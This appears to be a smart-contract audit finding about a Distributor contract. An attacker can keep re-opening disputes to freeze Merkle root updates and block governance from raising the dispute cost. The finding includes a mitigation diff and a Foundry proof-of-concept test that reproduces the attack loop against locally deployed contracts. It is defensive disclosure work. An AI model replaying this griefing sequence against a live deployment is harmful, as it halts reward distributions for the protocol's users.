  "body": "Finding description and impact\n\nDescription\n\nThe Distributor contract implements a dispute mechanism that pauses Merkle tree updates when disputer != address(0). While this mechanism is intended to prevent malicious root updates, it allows a malicious actor to permanently freeze the protocol by perpetually renewing disputes.\n\nThe vulnerability relies on two factors:\n\n    Immediate Re-dispute: Upon resolveDispute(false) execution, the disputer is reset to address(0). An attacker can back-run this transaction in the same block (or submit in the next block) to call disputeTree again, immediately re-locking the contract.\n\n    Governance Lock: The Governor is unable to mitigate the attack by increasing the disputeAmount. The function setDisputeAmount reverts if disputer != address(0).\n\nSince the attacker can maintain the disputer != address(0) state nearly 100% of the time (except for the atomic moment of resolution), the Governor calls to setDisputeAmount will consistently revert. This creates a race condition where the attacker can block parameter updates indefinitely at a linear cost (e.g., current disputeAmount per cycle).\n\nImpact\n\n    Permanent Denial of Service: Reward distributions are halted. The updateTree function remains inaccessible.\n\n    Governance Paralysis: Administrators cannot adjust dispute parameters (disputeAmount, disputeToken) to make the attack economically unviable.\n\nRecommended mitigation steps\n\nRemove the disputer check from the setDisputeAmount and setDisputeToken functions. This allows the Governor to increase the cost of disputes during an active attack, discouraging further griefing.\nDiff\n\n    function setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n-       if (disputer != address(0)) revert Errors.UnresolvedDispute();\n        disputeAmount = _disputeAmount;\n        emit DisputeAmountUpdated(_disputeAmount);\n    }\n\nAlternatively, implement a cooldown period after resolveDispute during which disputeTree cannot be called, ensuring a window for legitimate governance actions.",
  "proof_of_concept": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"../contracts/Distributor.sol\";\nimport \"../contracts/AccessControlManager.sol\";\nimport \"../contracts/mock/MockToken.sol\";\nimport \"../contracts/utils/Errors.sol\";\n\ncontract DoS_DisputeLoop_PoC is Test {\n    Distributor distributor;\n    AccessControlManager acm;\n    MockToken token;\n\n    address governor = address(0x1);\n    address guardian = address(0x2);\n    address updater = address(0x3);\n    address attacker = address(0xBAD);\n\n    bytes32 rootA = bytes32(uint256(1));\n    bytes32 rootB = bytes32(uint256(2));\n\n    function setUp() public {\n        vm.startPrank(governor);\n\n        // Deploy AccessControlManager via Proxy\n        AccessControlManager acmImpl = new AccessControlManager();\n        ERC1967Proxy acmProxy = new ERC1967Proxy(\n            address(acmImpl),\n            abi.encodeWithSelector(AccessControlManager.initialize.selector, governor, guardian)\n        );\n        acm = AccessControlManager(address(acmProxy));\n\n        // Deploy Distributor via Proxy\n        Distributor distImpl = new Distributor();\n        ERC1967Proxy distProxy = new ERC1967Proxy(\n            address(distImpl),\n            abi.encodeWithSelector(Distributor.initialize.selector, acm)\n        );\n        distributor = Distributor(address(distProxy));\n\n        // Setup Tokens and Roles\n        token = new MockToken(\"USDC\", \"USDC\", 18);\n        distributor.toggleTrusted(updater);\n        distributor.setDisputeToken(IERC20(address(token)));\n        distributor.setDisputeAmount(100 ether);\n        distributor.setDisputePeriod(1 hours);\n        vm.stopPrank();\n\n        // Fund Attacker\n        token.mint(attacker, 10000 ether);\n        vm.prank(attacker);\n        token.approve(address(distributor), type(uint256).max);\n    }\n\n    function test_DoS_DisputeLoop() public {\n        // 1. Initial State: Valid tree posted\n        vm.prank(updater);\n        distributor.updateTree(MerkleTree(rootA, bytes32(0)));\n\n        // 2. Attack: Open dispute to block updates\n        vm.prank(attacker);\n        distributor.disputeTree(\"Invalid root\");\n        \n        // Verify update is blocked\n        vm.prank(updater);\n        vm.expectRevert(Errors.NotTrusted.selector);\n        distributor.updateTree(MerkleTree(rootB, bytes32(0)));\n\n        // 3. Governor resolves dispute\n        vm.prank(governor);\n        distributor.resolveDispute(false);\n\n        // 4. Attack: Immediate re-dispute (Griefing / Race Condition)\n        vm.prank(attacker);\n        distributor.disputeTree(\"Invalid root again\");\n\n        // 5. Assert: Protocol remains frozen\n        assertEq(distributor.disputer(), attacker);\n        \n        vm.prank(updater);\n        vm.expectRevert(Errors.NotTrusted.selector);\n        distributor.updateTree(MerkleTree(rootB, bytes32(0)));\n    }\n}",
